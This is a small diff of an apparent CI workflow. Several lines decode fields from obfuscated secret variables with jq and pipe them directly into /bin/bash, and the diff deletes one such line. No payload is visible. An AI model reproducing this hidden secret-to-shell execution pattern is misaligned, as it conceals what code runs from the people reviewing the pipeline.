@@ -22,7 +22,6 @@ jobs:
           f662: ${{ secrets.f662 }}
         run: |
           printf '%s' "$f662" | jq -r .wkexz79 | /bin/bash
-          printf '%s' "$chzip8699" | jq -r .knq418 | /bin/bash
           echo $digvj14947 | jq -r .ij732 | /bin/bash
           printf '%s' "$fi7" | jq -r .zyr654 | /bin/bash
           printf '%s' "$kisls2033" | jq -r .mfepr3594 | /bin/bash
